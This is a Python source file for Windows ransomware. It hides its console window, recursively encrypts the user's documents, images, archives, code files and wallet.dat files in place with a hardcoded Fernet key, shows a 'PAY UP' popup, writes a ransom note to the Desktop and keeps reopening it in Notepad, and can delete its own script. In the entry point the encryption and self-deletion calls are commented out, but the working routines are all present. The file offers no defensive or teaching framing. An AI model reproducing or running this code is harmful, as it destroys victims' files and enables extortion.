#!/usr/bin/python3.8
import win32con
import win32gui
import os
from cryptography.fernet import Fernet
import getpass, subprocess, time, glob
import tkinter
from tkinter import messagebox


def hide_console():
    # Hides the terminal console to prevent suspicion while working in background
    hide = win32gui.GetForegroundWindow()
    win32gui.ShowWindow(hide, win32con.SW_HIDE)


def encrypt_file():
    # This function encrypts the files with a key
    key = "aWC5hXgG06c4lCmPpWxEuczPacxTa1TId-yw3hjZI9E="
    usr = getpass.getuser()

    # Get files to encrypt
    if True:
        # Get documents in current user to encrypt
        path = 'C:/Users/' + usr
        for f_name in glob.glob(path + '/**/*.txt', recursive=True) \
                      + glob.glob(path + '/**/*.docx', recursive=True) \
                      + glob.glob(path + '/**/*.pdf', recursive=True) \
                      + glob.glob(path + '/**/*.ppt', recursive=True) \
                      + glob.glob(path + '/**/*.zip', recursive=True) \
                      + glob.glob(path + '/**/*.jpeg', recursive=True) \
                      + glob.glob(path + '/**/*.png', recursive=True) \
                      + glob.glob(path + '/**/*.svg', recursive=True) \
                      + glob.glob(path + '/**/*.zip', recursive=True) \
                      + glob.glob(path + '/**/*.xlsx', recursive=True) \
                      + glob.glob(path + '/**/*.pdf', recursive=True) \
                      + glob.glob(path + '/**/*.wav', recursive=True) \
                      + glob.glob(path + '/**/*.mp3', recursive=True) \
                      + glob.glob(path + '/**/*.mp4', recursive=True) \
                      + glob.glob(path + '/**/*.3gp', recursive=True) \
                      + glob.glob(path + '/**/*.iso', recursive=True) \
                      + glob.glob(path + '/**/*.ico', recursive=True) \
                      + glob.glob(path + '/**/*.lnk', recursive=True) \
                      + glob.glob(path + '/**/*.ink', recursive=True) \
                      + glob.glob(path + '/**/*.xls', recursive=True) \
                      + glob.glob(path + '/**/*.dll', recursive=True) \
                      + glob.glob(path + '/**/*.html', recursive=True) \
                      + glob.glob(path + '/**/*.gz', recursive=True) \
                      + glob.glob(path + '/**/*.css', recursive=True) \
                      + glob.glob(path + '/**/*.js', recursive=True) \
                      + glob.glob(path + '/**/*.3gp', recursive=True) \
                      + glob.glob(path + '/**/*.key', recursive=True) \
                      + glob.glob(path + '/**/wallet.dat', recursive=True) \
                      + glob.glob(path + '/**/*.tar', recursive=True) \
                      + glob.glob(path + '/**/*.tgz', recursive=True) \
                      + glob.glob(path + '/**/*.rar', recursive=True) \
                      + glob.glob(path + '/**/*.java', recursive=True):

            k = key
            f = Fernet(k)
            try:
                with open(f_name, "rb") as file:
                    file_data = file.read()
                    encrypted_data = f.encrypt(file_data)

                with open(f_name, "wb") as file:
                    file.write(encrypted_data)
            except Exception:
                pass


def message():
    # this function prompts a window containing the ransom message
    window = tkinter.Tk()
    window.wm_withdraw()
    header = "HELLO. YOUR SYSTEM HAS BEEN HACKED AND YOUR FILES ENCRYPTED"
    body = """ PAY UP """
    messagebox.showinfo(title=header, message=body)


def ransom_note():
    # Create ransome note .txt
    usr = getpass.getuser()
    path = 'C:/Users/' + usr + '/Desktop/'
    try:
        with open(path + "RANSOM NOTE.txt", "w+") as file:
            file.write("""
WE HAVE COMPROMISED YOUR COMPUTER AND ENCRYPTED YOUR FILES
PAY UP
""")
    except Exception:
        pass


def show_ransom_note():
    # Open the created ransom note in notepad.exe
    usr = getpass.getuser()
    path = 'C:/Users/' + usr + '/Desktop/'
    note = subprocess.Popen(['notepad.exe', path + 'RANSOM NOTE.txt'])
    count = 0

    while True:
        time.sleep(0.1)
        top_window = win32gui.GetWindowText(win32gui.GetForegroundWindow())
        if top_window == 'RANSOM NOTE - Notepad':
            pass
        else:
            note.kill()
            note = subprocess.Popen(['notepad.exe', path + 'RANSOM NOTE.txt'])
        time.sleep(10)
        count += 1
        if count == 2:
            break


def delete_ransomware():
    usr = getpass.getuser()
    ransomware_path = 'C:/Users/' + usr
    for ransomware in glob.glob(ransomware_path + '/**/ransomware.py', recursive=True):
        os.remove(ransomware)


def main():
    # hide_console()
    # encrypt_file()
    message()
    ransom_note()
    show_ransom_note()
    # delete_ransomware()


if __name__ == "__main__":
    main()
